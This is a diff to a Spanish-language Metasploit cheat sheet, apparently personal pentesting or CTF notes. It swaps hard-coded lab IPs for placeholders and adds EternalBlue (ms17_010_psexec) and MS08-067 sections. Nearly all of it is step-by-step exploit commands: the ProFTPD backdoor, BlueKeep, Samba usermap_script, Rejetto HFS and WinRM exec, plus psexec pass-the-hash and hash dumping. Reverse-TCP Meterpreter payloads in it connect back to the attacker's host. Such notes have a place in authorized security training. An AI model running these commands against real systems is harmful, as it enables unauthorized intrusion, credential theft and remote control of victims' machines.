@@ -10,19 +10,19 @@ Tags: #Metasploit #WebDav #BadBlue #SMB #BlueKeep #Samba #EternalBlue #FTP #HFS
 
 	❯ use exploit/unix/ftp/proftpd_133c_backdoor          # Usamos el exploit                
 	❯ options
-	❯ set RHOSTS 192.168.68.1                     
+	❯ set RHOSTS ❮IP❯                    
 	❯ exploit
 
 ❯ ctrl + z                   # Colocas la sesion en 'Background'
 ❯ sessions                   # Miramos las sesiones activas 
-❯ sessions -u <ID>           # Regresamos a la sesion y lo hara con Meterpreter
+❯ sessions -u ❮ID❯           # Regresamos a la sesion y lo hara con Meterpreter
 ```
 
 Si ya tenemos una sesión activa como root, podemos usar el siguiente modulo para el **'dumpeo de hashes'** de los usuarios existentes. 
 ```bash 
 	❯ use post/linux/gather/hashdump          # Usamos el exploit                
 	❯ options
-	❯ set SESSION <ID>                        # Colocamos la sesion que ya tenemos activa en el 'Background'                      
+	❯ set SESSION ❮ID❯                        # Colocamos la sesion que ya tenemos activa en el 'Background'                      
 	❯ run 
 ```
 ## HTTP 80
@@ -37,7 +37,7 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 
 	❯ use exploit/windows/http/badblue_ext_passthruerflow         # Usamos el exploit                
 	❯ options
-	❯ set RHOSTS 192.168.68.1                     
+	❯ set RHOSTS ❮IP❯                     
 	❯ exploit
 ```
 
@@ -49,7 +49,7 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 
 	❯ use exploit/multi/http/processmaker_exec    # Usamos el exploit
 	❯ options
-	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
 	❯ exploit 
 ```
 
@@ -62,7 +62,7 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 	❯ use multi/handler                 
 	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
 	❯ options
-	❯ set LHOST 192.168.68.1                     
+	❯ set LHOST ❮IP❯                     
 	❯ set LPORT 1234
 	❯ run
 ```
@@ -74,11 +74,11 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 	❯ search iis upload                                  # Buscamos el exploit a usar
 	❯ use exploit/windows/iss/iss_webdav_upload_asp	   # Usamos el exploit
 	❯ options
-	❯ set LHOST 192.168.68.1                     
+	❯ set LHOST ❮IP❯                     
 	❯ set LPORT 1234
 	❯ set HttpUsername <user>                            # Debemos de colocar credenciales validas 
 	❯ set HttpPassword <passwd>
-	❯ set RHOSTS 192.168.1.194                           # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                    # Colocamos la IP de la maquina victima
 	❯ set PATH /webdav/metasploit.asp                    # Colocamos la ruta y el nombre del archivo 
 	❯ exploit
 ```
@@ -91,7 +91,7 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 
 	❯ use exploit/multi/http/apache_mod_cgi_bash_env_exec                 
 	❯ options
-	❯ set RHOSTS 192.168.68.1                     
+	❯ set RHOSTS ❮IP❯                     
 	❯ set TARGETURI /gettime.cgi
 	❯ exploit
 ```
@@ -106,7 +106,7 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 
 	❯ use exploit/windows/smb/psexec               # Usamos el exploit
 	❯ options
-	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
 	❯ set SMBPass <passwd>
 	❯ set SMBUser Administrator
 	❯ exploit 
@@ -116,7 +116,7 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 ```bash 
 ❯ use exploit/windows/smb/psexec        # Usamos el exploit para hacer pass the hash              
 ❯ options
-❯ set RHOSTS 192.168.68.1   
+❯ set RHOSTS ❮IP❯   
 ❯ set LPORT 443
 ❯ set SMBUser Administrator
 ❯ set SMBPass <hash>                    # Pegamos todo el hash obtenido 
@@ -132,7 +132,7 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 	❯ use auxiliary/scanner/smb/psexec_loggedin_users    # Usamos el auxiliar
 	❯ options
 	❯ set PAYLOAD windows/x64/meterpreter/reverse_tcp
-	❯ set RHOSTS 192.168.1.194                           # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                    # Colocamos la IP de la maquina victima
 	❯ set SMBUser Administrator
 	❯ set SMBPass <Passwd>
 	❯ exploit 
@@ -147,23 +147,47 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 	❯ search samba 
 	❯ use exploit/multi/samba/usermap_script       # Usamos el exploit
 	❯ options
-	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
-	❯ set LHOST 192.168.1.157                      # Colocamos la IP de nuestra maquina 
+	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
+	❯ set LHOST ❮IP❯                               # Colocamos la IP de nuestra maquina 
 	❯ exploit 
 	❯ shell 
 ```
 
-## EternalBlue (CVE-2017-0144)
+## EternalBlue (MS17-010) Windows 7
 
 ```bash 
-# Usaremos el EternalBlue SMBv1
+# Usaremos el EternalBlue SMBv1 y solo soporta sistemas de x64
 ❯ msfconsole -q                  # q = Quitar el banner de inicio
 
 	❯ use exploit/windows/smb/ms17_010_eternalblue      # Usamos el exploit
 	❯ options
 	❯ set payload windows/x64/meterpreter/reverse_tcp
-	❯ set LHOST 192.168.1.157                          # Colocamos la IP de nuestra maquina 
-	❯ set RHOSTS 192.168.1.194                         # Colocamos la IP de la maquina victima
+	❯ set LHOST ❮IP❯                                    # Colocamos la IP de nuestra maquina 
+	❯ set RHOSTS ❮IP❯                                   # Colocamos la IP de la maquina victima
+	❯ exploit 
+
+
+# Este si funciona para sistemas de x86 y x64
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use exploit/windows/smb/ms17_010_psexec          # Usamos el exploit
+	❯ options
+	❯ set payload windows/x64/meterpreter/reverse_tcp
+	❯ set LHOST ❮IP❯                                   # Colocamos la IP de nuestra maquina 
+	❯ set RHOSTS ❮IP❯                                  # Colocamos la IP de la maquina victima
+	❯ exploit 
+
+```
+
+## MS08-067 Windows XP
+
+```bash 
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use exploit/windows/smb/ms08_067_netapi      # Usamos el exploit
+	❯ options
+	❯ set LHOST ❮IP❯                               # Colocamos la IP de nuestra maquina 
+	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
 	❯ exploit 
 ```
 
@@ -178,8 +202,8 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 	❯ use exploit/windows/rdp/cve_2019_0708_bluekeep_rce      # Usamos el exploit
 	❯ options
 	❯ set payload windows/x64/meterpreter/reverse_tcp
-	❯ set LHOST 192.168.1.157   
-	❯ set RHOSTS 192.168.1.194                                # Colocamos la IP de la maquina victima
+	❯ set LHOST ❮IP❯  
+	❯ set RHOSTS ❮IP❯                                         # Colocamos la IP de la maquina victima
 	❯ show targets                                            # Nos muestra los diferentes targets
 	❯ set target <windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)>  # Colocamos la arquitectura en donde se esta ejecutando la maquina victima 
 	❯ exploit
@@ -194,8 +218,8 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 	❯ use exploit/windows/winrm/winrm_script_exec      # Usamos el exploit
 	❯ options
 	❯ set payload windows/x64/meterpreter/reverse_tcp
-	❯ set LHOST 192.168.1.157                          # Colocamos la IP de nuestra maquina 
-	❯ set RHOSTS 192.168.1.194                         # Colocamos la IP de la maquina victima
+	❯ set LHOST ❮IP❯                                   # Colocamos la IP de nuestra maquina 
+	❯ set RHOSTS ❮IP❯                                  # Colocamos la IP de la maquina victima
 	❯ set FORCE_VBS true                               
 	❯ set USERNAME administrator
 	❯ set PASSWORD <passwd>
@@ -215,12 +239,12 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 
 	❯ use post/multi/recon/local_exploit_suggester        # Usamos el exploit
 	❯ options
-	❯ set session <ID>          # Colocamos el numero de la session activa de la maquina victima 
+	❯ set session ❮ID❯          # Colocamos el numero de la session activa de la maquina victima 
 	❯ run 
 	
 	❯ use <exploit_name>        # Usamos algun exploit de los que nos muestra
 	❯ show options 
-	❯ set session <ID>
+	❯ set session ❮ID❯
 	❯ set LPORT 443
 	❯ exploit
 ```
@@ -233,8 +257,8 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 
 	❯ use exploit/windows/http/rejetto_hfs_exec        # Usamos el exploit 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                         # Colocamos la IP de la maquina victima
-	❯ set LHOST 192.168.1.10                           # Colocamos nuestra IP (En caso de que estemos en una VPN)
+	❯ set RHOSTS ❮IP❯                                  # Colocamos la IP de la maquina victima
+	❯ set LHOST ❮IP❯                                   # Colocamos nuestra IP (En caso de que estemos en una VPN)
 	❯ exploit 
 	❯ shell                                            # Creamos una sesion Shell para colocar los comandos mas facilmente
 ```
